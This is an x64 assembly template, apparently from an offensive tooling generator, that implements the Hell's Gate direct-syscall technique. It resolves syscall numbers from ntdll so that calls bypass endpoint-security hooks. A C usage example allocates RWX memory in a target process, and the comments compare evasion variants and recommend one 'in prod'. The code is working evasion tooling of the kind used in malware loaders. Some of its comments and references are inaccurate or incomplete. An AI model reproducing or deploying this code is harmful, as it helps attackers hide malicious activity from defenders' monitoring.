; hells_gate.asm — reference template for `hells-gate`
;
; Direct syscall gadget: resolve the SSN dynamically at runtime by
; walking the Nt* exports in ntdll + parsing the `mov eax, SSN`
; prologue (bytes 4-7 of the exported Nt stub).
;
; Operator fills in:
;   {{ssn_resolver}}  — a C helper that walks ntdll exports + returns
;                       the SSN for a given Nt function name
;
; Example usage from C:
;
;   extern NTSTATUS HellsGate_NtAllocateVirtualMemory(
;       HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
;   DWORD ssn = resolve_ssn("NtAllocateVirtualMemory");
;   HellsGate_Prepare(ssn);
;   NTSTATUS st = HellsGate_NtAllocateVirtualMemory(
;       hProcess, &addr, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);

; Note: Hell's Gate's weakness is that a hooked Nt stub has an altered
; prologue — the SSN extraction fails. Halo's Gate (next template)
; handles that by walking neighbors; FreshyCalls does the same via
; EAT walking + an ntdll gadget. Prefer FreshyCalls in prod.

bits 64

section .data
global current_ssn
current_ssn: dd 0

section .text
global HellsGate_Prepare
global HellsGate_syscall

; Stash the SSN before each syscall.
HellsGate_Prepare:
    mov [rel current_ssn], ecx
    ret

; Issue a direct syscall with up to 4 args passed in RCX/RDX/R8/R9
; (Windows x64 ABI). The syscall instruction preserves R10 — the
; kernel reads syscall args from R10 instead of RCX, so we juggle.
HellsGate_syscall:
    mov r10, rcx
    mov eax, [rel current_ssn]
    syscall
    ret
